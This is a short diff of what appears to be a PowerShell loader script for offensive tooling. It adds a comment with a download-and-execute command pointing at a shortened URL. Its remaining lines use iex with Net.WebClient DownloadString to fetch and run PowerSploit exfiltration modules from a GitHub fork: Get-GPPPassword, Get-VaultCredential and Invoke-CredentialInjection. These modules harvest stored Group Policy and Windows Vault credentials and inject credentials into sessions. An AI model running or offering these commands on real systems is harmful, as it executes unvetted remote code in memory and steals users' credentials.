@@ -1,3 +1,5 @@
+#command to load
+#iex(New-Object Net.WebClient).DownloadString('http://j.mp/redfast')
 iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
 iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Get-VaultCredential.ps1')
 iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Invoke-CredentialInjection.ps1')
